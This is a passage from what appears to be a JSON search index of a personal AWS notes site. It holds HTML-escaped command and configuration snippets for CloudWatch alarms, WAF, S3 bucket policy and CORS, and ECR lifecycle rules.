style=\"color:#e6db74\"\u003e}\u003c/span\u003e|awk -F \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;,\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print $1}\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    VALUE\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eecho \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eline\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e|awk -F \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;,\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print $2}\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    aws cloudwatch put-metric-alarm \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --alarm-name \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eID\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e_netout \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --metric-name NetworkOut \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --namespace AWS/EC2 \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --statistic Average \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --period \u003cspan style=\"color:#ae81ff\"\u003e300\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --threshold \u003cspan style=\"color:#ae81ff\"\u003e2560000\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --comparison-operator GreaterThanOrEqualToThreshold \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --dimensions  \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Name=InstanceId,Value=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eVALUE\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --evaluation-periods \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --alarm-actions arn:aws:sns:\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eregion\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e:\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eaccount_id\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e:\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003etopic\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e##--unit Bytes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$ID\u003cspan style=\"color:#e6db74\"\u003e done\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eWAF\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws wafv2 create-web-acl \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --name acl_name \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --scope CLOUDFRONT \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --default-action Allow\u003cspan style=\"color:#f92672\"\u003e={}\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --visibility-config SampledRequestsEnabled\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003etrue,CloudWatchMetricsEnabled\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003etrue,MetricName\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003emetric_acl_name \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --rule\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eMount S3 Bucket on EC2\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cp\u003ereferences: \u003ca href=\"https://linuxbeast.com/blog/how-to-mount-s3-bucket-on-ubuntu-22-04-with-s3fs-fuse/\" target=\"_blank\" rel=\"noopener\"\u003eHow to Mount S3 Bucket on Ubuntu 22.04 with S3FS Fuse\u003c/a\u003e\u003c/p\u003e","tags":null,"title":"AWS Command"},{"categories":null,"contents":" S3 Bucket Policy { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Sid\u0026#34;: \u0026#34;AllowPublicRead\u0026#34;, \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Principal\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;Action\u0026#34;: \u0026#34;s3:GetObject\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;arn:aws:s3:::bucketName/*\u0026#34; } ] } S3 CORS [ { \u0026#34;AllowedHeaders\u0026#34;: [\u0026#34;*\u0026#34;], \u0026#34;AllowedMethods\u0026#34;: [\u0026#34;GET\u0026#34;, \u0026#34;PUT\u0026#34;, \u0026#34;POST\u0026#34;, \u0026#34;DELETE\u0026#34;], \u0026#34;AllowedOrigins\u0026#34;: [\u0026#34;*\u0026#34;], \u0026#34;ExposeHeaders\u0026#34;: [ \u0026#34;x-amz-server-side-encryption\u0026#34;, \u0026#34;x-amz-request-id\u0026#34;, \u0026#34;x-amz-id-2\u0026#34; ], \u0026#34;MaxAgeSeconds\u0026#34;: 3000 } ] ECR Lifecycle Policy { \u0026#34;rules\u0026#34;: [ { \u0026#34;rulePriority\u0026#34;: 1, \u0026#34;description\u0026#34;: \u0026#34;Keep only the last 100 images\u0026#34;, \u0026#34;selection\u0026#34;: { \u0026#34;tagStatus\u0026#34;: \u0026#34;any\u0026#34;, \u0026#34;countType\u0026#34;: \u0026#34;imageCountMoreThan\u0026#34;, \u0026#34;countNumber\u0026#34;: 100 }, \u0026#34;action\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;expire\u0026#34; } } ] } ECR Lifecycle Policy1 { \u0026#34;rules\u0026#34;: [ { \u0026#34;rulePriority\u0026#34;: 1, \u0026#34;description\u0026#34;: \u0026#34;Remove images with certain tag\u0026#34;, \u0026#34;selection\u0026#34;: { \u0026#34;tagStatus\u0026#34;: \u0026#34;tagged\u0026#34;, \u0026#34;tagPrefixList\u0026#34;: [\u0026#34;tag1\u0026#34;, \u0026#34;tag2\u0026#34;], \u0026#34;countType\u0026#34;: \u0026#34;imageCountMoreThan\u0026#34;, \u0026#34;countNumber\u0026#34;: 0 }, \u0026#34;action\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;expire\u0026#34; } } ] } ECR Lifecycle Policy2 { \u0026#34;rules\u0026#34;: [ { \u0026#34;rulePriority\u0026#34;: 1, \u0026#34;description\u0026#34;: \u0026#34;Remove untagged images older than 14 days\u0026#34;, \u0026#34;selection\u0026#34;: { \u0026#34;tagStatus\u0026#34;: \u0026#34;untagged\u0026#34;, \u0026#34;countType\u0026#34;: \u0026#34;sinceImagePushed\u0026#34;, \u0026#34;countUnit\u0026#34;: \u0026#34;days\u0026#34;, \u0026#34;countNumber\u0026#34;: 14 }, \u0026#34;action\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;expire\u0026#34; } } ] } ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/aws/configure/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eS3 Bucket Policy\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;Version\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;2012-10-17\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;Statement\u0026#34;\u003c/span\u003e: [\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;Sid\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;AllowPublicRead\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;Effect\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Allow\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;Principal\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;*\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;Action\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;s3:GetObject\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;Resource\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;arn:aws:s3:::bucketName/*\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eS3 CORS\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e[\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;AllowedHeaders\u0026#34;\u003c/span\u003e: [\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;*\u0026#34;\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;AllowedMethods\u0026#34;\u003c/span\u003e: [\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;GET\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;PUT\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;POST\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;DELETE\u0026#34;\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;AllowedOrigins\u0026#34;\u003c/span\u003e: [\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;*\u0026#34;\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;ExposeHeaders\u0026#34;\u003c/span\u003e: [\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;x-amz-server-side-encryption\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;x-amz-request-id\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;x-amz-id-2\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;MaxAgeSeconds\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e3000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eECR Lifecycle Policy\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;rules\u0026#34;\u003c/span\u003e: [\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;rulePriority\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;description\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Keep only the last 100 images\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;selection\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;tagStatus\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;any\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;countType\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;imageCountMoreThan\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;countNumber\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t},\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;action\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;expire\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eECR Lifecycle Policy1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;rules\u0026#34;\u003c/span\u003e: [\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;rulePriority\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;description\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Remove images with certain tag\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;selection\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;tagStatus\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;tagged\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;tagPrefixList\u0026#34;\u003c/span\u003e: [\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;tag1\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;tag2\u0026#34;\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;countType\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;imageCountMoreThan\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;countNumber\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t},\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;action\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;expire\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eECR Lifecycle Policy2\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;rules\u0026#34;\u003c/span\u003e: [\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;rulePriority\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;description\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Remove untagged images older than 14 days\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;selection\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;tagStatus\u0026#34;\u003c/span\u003e: \u003cspan 